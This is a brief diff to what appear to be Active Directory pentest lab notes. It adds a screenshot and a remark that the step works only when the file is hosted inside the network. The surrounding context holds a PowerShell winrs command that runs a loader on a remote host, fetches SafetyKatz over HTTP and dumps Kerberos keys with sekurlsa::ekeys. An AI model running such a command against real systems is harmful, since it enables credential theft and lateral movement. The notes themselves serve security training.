@@ -210,3 +210,5 @@ Launch safety katz
 ```Powershell
 $null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
 ```
+![[Pasted image 20231019104347.png]]
+==Works only if file is hosted inside the network==
